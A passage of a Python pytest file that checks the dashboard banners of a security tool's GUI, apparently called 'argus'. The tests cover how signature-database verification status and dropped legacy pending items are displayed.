    backend.config.history_db = str(tmp_path / "history.db")
    backend.save_config()
    yield backend
    backend.close()


def _dashboard(qapp, gui_backend):
    from argus.gui.backend import ProtectionController
    from argus.gui.dashboard import DashboardPage

    protection = ProtectionController(gui_backend)
    page = DashboardPage(gui_backend, protection)
    return page, protection


@pytestmark_gui
def test_fix3_gui_no_red_banner_when_service_verified(
    qapp, gui_backend, tmp_path
):
    # The deferred state: this account structurally verified
    # only. The service's status says IT verified in full.
    gui_backend.signature_db_auth_deferred = True
    (tmp_path / "status.json").write_text(
        json.dumps({
            "running": True, "state": "running",
            "signature_db_auth": "verified",
        }),
        encoding="utf-8",
    )
    page, _protection = _dashboard(qapp, gui_backend)
    page._refresh_sigdb_banner()
    assert page.sigdb_banner.isHidden()


@pytestmark_gui
def test_fix3_gui_deferred_without_service_is_informational(
    qapp, gui_backend
):
    gui_backend.signature_db_auth_deferred = True
    page, _protection = _dashboard(qapp, gui_backend)
    page._refresh_sigdb_banner()
    assert not page.sigdb_banner.isHidden()
    assert "structure only" in page.sigdb_banner.text()
    # Informational styling, NOT the red alarm style.
    assert page.sigdb_banner.styleSheet() == page._sigdb_info_style


@pytestmark_gui
def test_fix2_gui_legacy_notice_shows_once(qapp, gui_backend):
    page, _protection = _dashboard(qapp, gui_backend)
    status = {
        "running": False, "state": "stopped",
        "legacy_pending_dropped": 3,
    }
    page.set_status(status)
    assert not page.legacy_banner.isHidden()
    assert "3 older pending item(s)" in page.legacy_banner.text()
    assert "never touched" in page.legacy_banner.text()
    # The count keeps being reported; the notice stays (shown
    # once per session, not re-rendered as new news).
    page.set_status(status)
    assert not page.legacy_banner.isHidden()


@pytestmark_gui
def test_fix2_gui_no_legacy_notice_when_nothing_dropped(qapp, gui_backend):
    page, _protection = _dashboard(qapp, gui_backend)
    page.set_status({"running": False, "state": "stopped"})
    assert page.legacy_banner.isHidden()
